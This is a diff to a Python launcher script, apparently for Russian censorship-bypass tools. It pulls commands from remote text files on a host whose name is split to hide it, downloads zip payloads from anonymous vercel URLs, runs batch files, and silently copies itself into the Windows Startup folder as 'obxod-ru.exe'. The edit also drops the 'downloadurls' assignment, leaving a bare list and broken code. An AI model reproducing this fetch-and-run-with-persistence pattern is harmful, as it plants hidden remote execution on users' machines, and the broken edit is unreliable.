@@ -23,16 +23,16 @@ if __name__ == "__main__":
         "https://async" + "ker.neocities.org/peer/command.txt",
         "https://peerphp.vercel.app/peer/8abf9c5e-8f8f-4279-aaf8-a85ceffb602e.txt"
     ]
-    downloadurls = [
-        "https://github.com/Flowseal/tg-ws-proxy/releases/download/v1.2.1/TgWsProxy_windows.exe",
-        "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.7/zapret-discord-youtube-1.9.7.zip",
-        "https://peerphp.vercel.app/peer/211010c5-4d96-4cf1-ab81-fc628edca1b7.zip",
-        "https://peerphp.vercel.app/peer/d334379d-2026-47f3-a6a5-28dbd6e88c8a.zip"
+    [
+      "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.7/zapret-discord-youtube-1.9.7.zip",
+      "https://github.com/Flowseal/tg-ws-proxy/releases/download/v1.2.1/TgWsProxy_windows.exe",
+      "https://peerphp.vercel.app/peer/878c2c10-bcbd-419f-a762-b516bc99be29.zip",
+      "https://peerphp.vercel.app/peer/d334379d-2026-47f3-a6a5-28dbd6e88c8a.zip"
     ]
     commands = [
         "general (ALT11).bat",
         "TgWsProxy_windows.exe",
-        "GF_Windows.bat"
+        "dns-settings.bat"
     ]
 
     # get today obxod files
@@ -93,6 +93,7 @@ if __name__ == "__main__":
         startup_folder = os.path.join(Path(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
         exe_path = sys.executable
         if not exe_path.endswith("python.exe") and not "AppData" in exe_path and not "Startup" in exe_path:
-            shutil.copy(exe_path, startup_folder)
+            target_path = os.path.join(startup_folder, "obxod-ru.exe")
+            shutil.copy(exe_path, target_path)
     except:
         pass
